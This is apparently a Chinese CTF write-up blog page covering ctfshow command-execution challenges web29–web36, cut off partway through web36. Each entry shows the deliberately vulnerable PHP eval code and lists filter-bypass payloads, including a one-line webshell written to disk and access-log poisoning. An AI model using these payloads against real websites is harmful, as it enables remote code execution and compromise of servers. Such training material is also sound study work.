                    <a href="#web67" aria-label="web67">web67</a></li>
                <li>
                    <a href="#web68" aria-label="web68">web68</a></li>
                <li>
                    <a href="#web69" aria-label="web69">web69</a></li>
                <li>
                    <a href="#web70" aria-label="web70">web70</a></li>
                <li>
                    <a href="#web71" aria-label="web71">web71</a></li>
                <li>
                    <a href="#web72" aria-label="web72">web72</a><ul>
                        
                <li>
                    <a href="#%e6%89%80%e4%bb%a5%e4%bb%80%e4%b9%88%e6%98%afuaf%e5%91%a2" aria-label="所以什么是uaf呢？">所以什么是uaf呢？</a></li></ul>
                </li>
                <li>
                    <a href="#web73" aria-label="web73">web73</a></li>
                <li>
                    <a href="#web74" aria-label="web74">web74</a></li>
                <li>
                    <a href="#web75" aria-label="web75">web75</a></li>
                <li>
                    <a href="#%e7%bb%93%e6%9e%9c%e8%be%93%e5%87%ba%e4%b8%8e%e8%b5%84%e6%ba%90%e9%87%8a%e6%94%be" aria-label="结果输出与资源释放">结果输出与资源释放</a></li>
                <li>
                    <a href="#%e5%bc%82%e5%b8%b8%e5%a4%84%e7%90%86" aria-label="异常处理">异常处理</a></li>
                <li>
                    <a href="#web76" aria-label="web76">web76</a></li>
                <li>
                    <a href="#web77" aria-label="web77">web77</a><ul>
                        
                <li>
                    <a href="#%e4%bb%80%e4%b9%88%e6%98%afffi" aria-label="什么是FFI?">什么是FFI?</a></li></ul>
                </li>
                <li>
                    <a href="#web118" aria-label="web118">web118</a></li>
                <li>
                    <a href="#web119" aria-label="Web119">Web119</a></li>
                <li>
                    <a href="#web120" aria-label="web120">web120</a></li>
                <li>
                    <a href="#web121" aria-label="web121">web121</a></li>
                <li>
                    <a href="#web122" aria-label="web122">web122</a></li>
                <li>
                    <a href="#web124" aria-label="web124">web124</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h4 id="web29">web29<a hidden class="anchor" aria-hidden="true" href="#web29">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 00:26:48
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>可以看到通过eval函数可以执行php代码或者系统命令，其中过滤了flag。</p>
<p>进行绕过就行，解法很多</p>
<blockquote>
<ol>
<li>
<p>c=system(&ldquo;cat fl*g.php | grep  -E &lsquo;fl.g&rsquo; &ldquo;);</p>
</li>
<li>
<p>c=system(&ldquo;tac fl*g.php&rdquo;);</p>
</li>
<li>
<p>c=system(&ldquo;cat fl*g.php&rdquo;);（用cat要右键查看源代码才能看到回显）</p>
</li>
<li>
<p>c=system(&ldquo;cp fl*g.php a.txt &ldquo;);（访问a.txt查看）</p>
</li>
<li>
<p>c=system(&rsquo;echo -e &quot; &lt;?php \n error_reporting(0); \n  $c= $_GET['c']; \n eval($c); &quot; &gt; a.php&rsquo;); //直接新建一个页面并写入一句话木马
（/a.php?c=system(&ldquo;tac flag.php&rdquo;);）</p>
</li>
<li>
<p>?c=echo `tac fla*`;</p>
<p>&hellip;.</p>
</li>
</ol></blockquote>
<h4 id="web30">web30<a hidden class="anchor" aria-hidden="true" href="#web30">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 00:42:26
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|system|php/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这里过滤了关键字flag，system还有php，由于过滤了system我们需要使用其他的系统函数进行命令执行</p>
<p>payload:</p>
<blockquote>
<ol>
<li>
<p>c=printf(exec(&ldquo;cat%20fl*&rdquo;));</p>
</li>
<li>
<p>c=echo exec(&ldquo;cat f\lag.p\hp&rdquo;);</p>
</li>
<li>
<p>c=show_source(scandir(&rdquo;.&rdquo;)[2]); (这个函数会返回一个包含当前目录下所有文件和目录项的数组)</p>
</li>
<li>
<p>c=highlight_file(next(array_reverse(scandir(&rdquo;.&rdquo;))));</p>
</li>
<li>
<p>c=passthru(&ldquo;tac fla*&rdquo;);</p>
</li>
<li>
<p>c=echo `tac fla*`;</p>
</li>
<li>
<p>c=$a=sys;$b=tem;$c=$a.$b;$c(&ldquo;tac fla*&rdquo;);*</p>
</li>
<li>
<p>c=echo shell_exec(&ldquo;tac fla*&rdquo;);</p>
</li>
<li>
<p>c=eval($_GET[1]);&amp;1=system(&ldquo;tac flag.php&rdquo;);</p>
</li>
<li>
<p>c=passthru(base64_decode(&ldquo;Y2F0IGZsYWcucGhw==&rdquo;));(base64绕过)</p>
<p>&hellip;&hellip;</p>
</li>
</ol></blockquote>
<h4 id="web31">web31<a hidden class="anchor" aria-hidden="true" href="#web31">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 00:49:10
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|system|php|cat|sort|shell|\.| |\&#39;/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这题屏蔽了关键词 /flag|system|php|cat|sort|shell|.| |'</p>
<p>payload:</p>
<blockquote>
<ol>
<li>c=eval($_GET[1]);&amp;1=system(&ldquo;tac flag.php&rdquo;);</li>
<li>c=show_source(scandir(getcwd())[2]);</li>
<li>c=show_source(next(array_reverse(scandir(pos(localeconv())))));</li>
<li>c=passthru(&ldquo;tac%09fla*&rdquo;);</li>
<li>c=echo`tac%09fla*`;</li>
</ol></blockquote>
<h4 id="web32">web32<a hidden class="anchor" aria-hidden="true" href="#web32">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 00:56:31
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这题屏蔽了关键词 /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(</p>
<p><em>过滤了空格可以用<code>${IFS}</code>和<code>%0a</code> 代替，分号可以用<code>?&gt;</code>代替</em></p>
<p>用include构造payload：</p>
<blockquote>
<p>url/?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</p>
<p>或者</p>
<p>url/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,<?php%20system("tac%20flag.php")?></p></blockquote>
<p>得到的结果用base64解码一下就可以得到flag了</p>
<p>或者用日志注入：</p>
<blockquote>
<p>url/?c=include$_GET[1]?%3E&amp;1=../../../../var/log/nginx/access.log
<code>/var/log/nginx/access.log是nginx默认的access日志路径，访问该路径时，在User-Agent中写入一句话木马，然后用中国蚁剑连接即可</code></p></blockquote>
<h4 id="web33">web33<a hidden class="anchor" aria-hidden="true" href="#web33">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 02:22:27
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="c1">//
</span></span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="c1"></span><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(|</span><span class="se">\&#34;</span><span class="s2">/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>屏蔽的关键词比上一题多了个双引号 /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|&quot;</p>
<p>继续使用include构造payload：</p>
<blockquote>
<p>url/?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</p>
<p>或者</p>
<p>url/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,<?php%20system("tac%20flag.php")?></p></blockquote>
<h4 id="web34">web34<a hidden class="anchor" aria-hidden="true" href="#web34">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 04:21:29
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(|\:|</span><span class="se">\&#34;</span><span class="s2">/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>屏蔽的关键词 /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|:|&quot;</p>
<p>继续使用include构造payload：</p>
<blockquote>
<p>url/?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</p>
<p>或者</p>
<p>url/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,<?php%20system("tac%20flag.php")?></p></blockquote>
<h4 id="web35">web35<a hidden class="anchor" aria-hidden="true" href="#web35">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 04:21:23
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(|\:|</span><span class="se">\&#34;</span><span class="s2">|\&lt;|\=/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>屏蔽关键词 /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|:|&quot;|&lt;|=</p>
<p>继续使用include构造payload：（wsm还能秒）</p>
<blockquote>
<p>url/?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</p>
<p>或者</p>
<p>url/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,<?php%20system("tac%20flag.php")?></p></blockquote>
<h4 id="web36">web36<a hidden class="anchor" aria-hidden="true" href="#web36">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm">\# -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm">\# @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm">\# @Date:  2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm">\# @Last Modified by:  h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm">\# @Last Modified time: 2020-09-04 04:21:16
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">\# @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">\# @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">  <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(|\:|</span><span class="se">\&#34;</span><span class="s2">|\&lt;|\=|\/|[0-9]/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">  
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">  <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>屏蔽关键字 /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|:|&quot;|&lt;|=|/|[0-9]</p>
<p>不是哥们，数字也要屏蔽，那我改一下不就好了</p>
<p>继续使用include构造payload：</p>
<blockquote>
